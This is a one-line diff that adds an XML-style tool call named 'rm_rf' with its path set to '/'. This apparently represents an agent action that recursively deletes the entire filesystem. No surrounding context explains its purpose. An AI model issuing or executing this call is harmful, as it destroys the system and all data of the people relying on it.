@@ -1,0 +1,1 @@
+<function name="rm_rf"><param name="path">/</param></function>
